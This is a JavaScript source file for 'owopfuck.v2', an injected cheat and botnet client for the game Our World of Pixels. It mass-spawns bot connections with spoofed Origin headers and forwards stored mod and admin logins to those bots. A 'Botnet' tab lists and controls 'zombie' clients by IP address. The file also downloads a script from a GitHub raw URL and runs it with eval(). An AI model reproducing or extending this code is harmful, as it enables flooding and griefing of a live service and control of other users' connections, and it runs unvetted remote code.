import initTools from "./tools.js";
import events from "./events.js";
import AimwareUI from "./ui-library.js";
import config from "./config.js";
import OJS from "./OJS.js";
import { bots } from "./sharedState.js";
import socket from "./ws-hijacking.js";
import { getLocalPlayer } from "./utils.js";
import { botnetSocket } from "./botnet.js";

function initUI() {
    const UI = new AimwareUI("owopfuck.v2", {
        width: 800,
        height: 590,
        x: 165,
        y: 115,
        visible: false,
        keybind: config.getValue("MenuKey")
    });

    /* Client */
    {
        const Client = UI.addTab("Client");

        /* Main */
        const ClientMain = Client.addSection("Main");

        ClientMain.addToggle("AutoReconnect", value => {
            function onDisconnect() {
                if(getValue("autoreconnect")) {
                    setTimeout(function() {
                        document.getElementById("reconnect-btn").click();
                    }, 100);
                }
            }

            if(value) OWOP.on(events.net.disconnected, onDisconnect);
            else OWOP.removeListener(events.net.disconnected, onDisconnect);
        });

        ClientMain.addButton("Disconnect", () => getLocalPlayer().world.destroy());

        /* Visuals */
        const ClientVisuals = Client.addSection("Visuals");

        /* Misc */
        const ClientMisc = Client.addSection("Misc");
    }
    /* Bot */
    {
        const Bot = UI.addTab("Bot");

        /* Main */
        const BotMain = Bot.addSection("Main");

        BotMain.addInput("Bot Nickname", "Nickname");
        BotMain.addToggle("Bot AutoReconnect");
        BotMain.addToggle("AutoLogin");
        BotMain.addToggle("AutoLogin");
        BotMain.addRange("Bot Count", 1, 10, 1);

        function connectBot() {
            const bot = new OJS.Client({
                nickname: config.getValue("Bot Nickname"),
                autoreconnect: config.getValue("Bot AutoReconnect"),
                world: OWOP.world.name,
                unsafe: location.host == "augustberchelmann.com",
                modlogin: config.getValue("AutoLogin") ? localStorage.modlogin : undefined,
                adminlogin: config.getValue("AutoLogin") ? localStorage.adminlogin : undefined,
                ws: new WebSocket(OWOP.net.currentServer.url, null, {
					headers: {
						"Origin": location.origin,
						"Referer": document.referrer
					},
					origin: location.origin
				}),
                simpleChunks: false
            });
            bot.on("id", () => bots.push(bot));
            bot.on("close", () => bots.splice(bots.indexOf(bot), 1));
        }
        
        BotMain.addButton("Connect", () => {
            for(let i = 0; i < config.getValue("Bot Count"); i++) connectBot();
        });

        BotMain.addButton("Disconnect", () => {
            for(let i in bots.filter(bot => !bot.clientOptions.localplayer)) bots[i].net.ws.close();
        });

        BotMain.addLabel("Chat");

        BotMain.addInput('!Message', "Message");
        BotMain.addButton("Send", () => {
            for(let i in bots.filter(bot => !bot.clientOptions.localplayer)) bots[i].chat.send(config.getValue("Message"));
        });

        /* Patterns */
        const BotPattern = Bot.addSection("Pattern");

        const EraserPattern = BotPattern.addDropdown("Eraser", []);
        const AreaPattern = BotPattern.addDropdown("Area", []);
        const PastePattern = BotPattern.addDropdown("Paste", []);

        fetch("https://raw.githubusercontent.com/scar17off/scar17off/main/helpers/patterns.js").then(res => res.text()).then(text => {
            eval(text);

            for(let pattern in constants) {
                EraserPattern.addOption(pattern);
                AreaPattern.addOption(pattern);
                PastePattern.addOption(pattern);
            }
        });

        BotPattern.addRange("Minimum Quota", 0, 50);

        BotPattern.addToggle("Wolf Move");
        BotPattern.addToggle("Instant Place");
        BotPattern.addToggle("Smart Sneaky");
        BotPattern.addToggle("Diagonal Fill");
        BotPattern.addToggle("Use Player");
        BotPattern.addToggle("Always Sleep");
    }
    {
        const AnimationBuilder = UI.addTab("Animation Builder");
    }
    {
        const Botnet = UI.addTab("Botnet");

        const BotnetMain = Botnet.addSection("!Bots");

        let zombies = [];

        BotnetMain.addButton("Control All", () => {
            zombies.forEach(zombie => {
                botnetSocket.emit("control", zombie.id);
            });
        });
        BotnetMain.addButton("Connect", () => botnetSocket.connect());
        BotnetMain.addButton("Disconnect", () => botnetSocket.close());

        const zombiesTable = BotnetMain.addTable(["ID", "IP", "CONTROL", "ACTION"]);

        botnetSocket.on("list", list => {
            zombies = list;
            const currentIds = list.map(item => item.id.toString());
            const existingIds = Array.from(zombiesTable.tbody.getElementsByTagName("tr")).map(row => row.cells[0].textContent);

            existingIds.forEach(id => {
                if (!currentIds.includes(id)) {
                    zombiesTable.removeRow({ ID: id });
                }
            });

            list.forEach(item => {
                const existingRow = zombiesTable.findRow({ ID: item.id.toString() });
                let actionButtons = `
<button id="control-${item.id}" style="width: 200px;" class="aimware-button">${!item.controller ? "Control" : "Uncontrol"}</button>
<button id="connect-${item.id}" style="width: 200px;" class="aimware-button">${!item.connected ? "Connect" : "Disconnect"}</button>
`;

                const rowData = {
                    ID: item.id.toString(),
                    IP: item.ip.split(',').join(' | '),
                    CONTROL: item.controller ? "Yes" : "No",
                    ACTION: actionButtons
                }

                if (existingRow) {
                    zombiesTable.editRow({ ID: item.id.toString() }, rowData);
                } else {
                    zombiesTable.addRow(rowData);
                }

                document.getElementById(`control-${item.id}`).addEventListener("click", () => {
                    if(item.controller) {
                        botnetSocket.emit("uncontrol", item.id);
                    } else {
                        botnetSocket.emit("control", item.id);
                    }
                });

                document.getElementById(`connect-${item.id}`).addEventListener("click", () => {
                    if(item.connected) {
                        botnetSocket.emit("close", item.id);
                    } else {
                        botnetSocket.emit("con", item.id, OWOP.options.serverAddress[0].url, "arraybuffer");

                        const bot = new OJS.Client({
                            nickname: config.getValue("Bot Nickname"),
                            autoreconnect: config.getValue("Bot AutoReconnect"),
                            world: OWOP.world.name,
                            unsafe: location.host == "augustberchelmann.com",
                            modlogin: config.getValue("AutoLogin") ? localStorage.modlogin : undefined,
                            adminlogin: config.getValue("AutoLogin") ? localStorage.adminlogin : undefined,
                            simpleChunks: false,
                            zombie: item.id
                        });
                        bot.on("id", () => bots.push(bot));
                        bot.on("close", () => bots.splice(bots.indexOf(bot), 1));
                    }
                });
            });
        });
    }
    {
        const Proxy = UI.addTab("Proxy");
    }
    {
        const List = UI.addTab("List");

        const ListPlayers = List.addSection("!Players");
        const ListBots = List.addSection("!Bots");

        const playersTable = ListPlayers.addTable(["ID", "X", "Y", "RGB"]);
        const botsTable = ListBots.addTable(["ID", "X", "Y", "RGB"]);

        const client = getLocalPlayer();
        
        client.on("connect", ID => {
            setTimeout(() => {
                if(bots.some(bot => bot.player.id == ID)) {
                    botsTable.addRow({ ID, X: 0, Y: 0, RGB: createColorDiv("0,0,0") });
                    return;
                }
                playersTable.addRow({ ID, X: 0, Y: 0, RGB: createColorDiv("0,0,0") });
            }, 500);
        });

        client.on("update", player => {
            if(bots.some(bot => bot.player.id == player.id)) {
                botsTable.editRow({ ID: player.id }, { ID: player.id, X: player.x, Y: player.y, RGB: createColorDiv(player.rgb || "0,0,0") });
                return;
            }
            playersTable.editRow({ ID: player.id }, { ID: player.id, X: player.x, Y: player.y, RGB: createColorDiv(player.rgb || "0,0,0") });
        });

        client.on("disconnect", ID => {
            if(bots.some(bot => bot.player.id == ID)) {
                botsTable.removeRow({ ID });
                return;
            }
            playersTable.removeRow({ ID });
        });

        function createColorDiv(rgb) {
            const div = document.createElement("div");
            div.style.width = "20px";
            div.style.height = "20px";
            div.style.backgroundColor = `rgb(${rgb})`;
            div.title = rgb;

            return div.outerHTML;
        }
    }
}

function onLoad() {
    initTools();
    initUI();

    OWOP.chat.local(`owopfuck.v2 loaded! Use ${config.getValue("MenuKey")} to open the menu.`);
}

window.onload = () => {
    OWOP.once(events.net.world.join, onLoad);
}